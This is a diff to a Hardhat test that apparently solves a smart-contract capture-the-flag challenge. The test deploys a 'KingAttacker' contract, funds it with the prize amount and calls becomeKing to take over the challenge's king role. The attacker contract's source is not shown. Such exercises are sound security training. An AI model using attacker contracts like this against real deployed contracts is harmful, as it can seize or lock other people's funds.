@@ -21,6 +21,18 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  const attackerFactory = await ethers.getContractFactory('KingAttacker')
+  let attacker = await attackerFactory.connect(eoa).deploy()
+
+  console.log(await challenge._king())
+
+  let requiredAmount = await challenge.prize() // 1 ETH
+  await attacker.connect(eoa).provideFunds({value:requiredAmount})
+  await attacker.connect(eoa).becomeKing(challenge.address)
+
+  console.log(await challenge._king())
+
 });
 
 after(async () => {
